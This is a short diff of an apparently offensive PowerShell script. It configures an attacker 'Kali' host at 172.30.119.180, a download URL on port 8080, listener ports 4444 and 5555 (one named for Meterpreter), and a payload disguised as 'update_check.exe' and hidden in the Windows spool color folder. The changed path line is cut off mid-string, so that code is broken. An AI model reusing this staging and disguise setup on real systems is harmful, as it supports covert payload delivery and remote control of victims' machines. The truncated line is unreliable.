@@ -3,7 +3,7 @@
 
 $kaliIP = "172.30.119.180"
 $baseURL = "http://${kaliIP}:8080"
-$basePath = "C:\Windows\System32\spool\drivers\color\update"
+$basePath = "C:\Windows\
 $challengePort = 4444
 $meterPort = 5555
 $payloadPath = "$basePath\update_check.exe"
